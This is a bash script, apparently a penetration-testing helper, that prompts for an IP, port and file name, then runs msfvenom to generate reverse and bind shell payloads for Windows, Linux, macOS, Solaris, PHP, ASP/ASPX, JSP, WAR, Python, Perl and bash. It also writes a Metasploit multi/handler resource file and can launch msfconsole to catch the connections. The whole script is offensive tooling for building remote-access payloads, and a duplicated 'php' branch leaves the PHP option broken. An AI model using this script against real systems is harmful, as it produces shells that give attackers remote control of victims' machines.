#!/bin/bash

options=('windows (exe)' 'windows-bind' 'cmd' 'linux (elf)' 'linux-bind' 'bash (sh)' 'solaris' 'php' 'asp' 'aspx' 'war' 'python' 'perl' 'jsp' 'mac' 'mac-bind')

for i in "${options[@]}"; do
echo "$i"
done

echo 'Choose a payload type (note that bind shells require RHOSTS ip)'
read payload

echo "What is your ip?"
read ip

echo "Choose a port"
read port

echo "Choose a file name"
read file

echo "use multi/handler" > meta.rc

if [[ "$payload" == "windows" || "$payload" == "exe" ]]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
        echo 'set payload windows/meterpreter/reverse_tcp' >> meta.rc
elif [[ "$payload" == "linux" || "$payload" == "elf" ]]; then
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
        echo 'set payload linux/x64/shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "php" ]; then
        msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > $file.elf
        echo 'set payload linux/x64/shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "php" ]; then
        msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $file.php
        echo 'set payload php/meterpreter_reverse_tcp' >> meta.rc
elif [ "$payload" == "aspx" ]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f aspx > $file.aspx
        echo 'set payload windows/meterpreter/reverse_tcp' >> meta.rc
elif [ "$payload" == "war" ]; then
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > $file.war
        echo 'set payload java/jsp_shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "python" ]; then
        msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $file.py
        echo 'set payload cmd/unix/reverse_python' >> meta.rc
elif [[ "$payload" == "bash" || "$payload" == "sh" ]]; then
        msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $file.sh
        echo 'set payload cmd/unix/reverse_bash' >> meta.rc
elif [ "$payload" == "perl" ]; then
        msfvenom -p cmd/unix/reverse_perl LHOST=$ip LPORT=$port -f raw > $file.pl
        echo 'set payload cmd/unix/reverse_perl' >> meta.rc
elif [ "$payload" == "jsp" ]; then
        msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw> $file.jsp
        echo 'set payload java/jsp_shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "linux-bind" ]; then
        msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$ip LPORT=$port -f elf > $file.elf
        echo 'set payload linux/x86/meterpreter/bind_tcp' >> meta.rc
elif [ "$payload" == "windows-bind" ]; then
        msfvenom -p windows/meterpreter/bind_tcp RHOST=$ip LPORT=$port -f exe > $file.exe
        echo 'set payload windows/meterpreter/bind_tcp' >> meta.rc
elif [ "$payload" == "cmd" ]; then
        msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe > $file.exe
        echo 'set payload windows/shell/reverse_tcp' >> meta.rc
elif [ "$payload" == "solaris" ]; then
        msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf -e x86/shikata_ga_nai -b '\x00' > $file.elf
        echo 'set payload solaris/x86/shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "mac" ]; then
        msfvenom -p osx/x86/shell_reverse_tcp LHOST=$ip LPORT=$port -f macho > $file.macho
        echo 'set payload osx/x86/shell_reverse_tcp' >> meta.rc
elif [ "$payload" == "mac-bind" ]; then
        msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=$port -f macho > $file.macho
        echo 'set payload osx/x86/shell_bind_tcp' >> meta.rc
elif [ "$payload" == "asp" ]; then
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $file.asp
        echo 'set payload windows/meterpreter/reverse_tcp' >> meta.rc
else
        echo "Unsupported payload type"
        exit 1
fi

echo "set LHOST $ip" >> meta.rc
echo "set LPORT $port" >> meta.rc
echo "run" >> meta.rc

echo 'Do you want to start metasploit multi/handler? (Y/N)'
read choice
if [[ "$choice" == "y" || "$choice" == "Y" ]]; then 
        msfconsole -r meta.rc
else 
        echo '================Exiting================'
        exit 1
fi
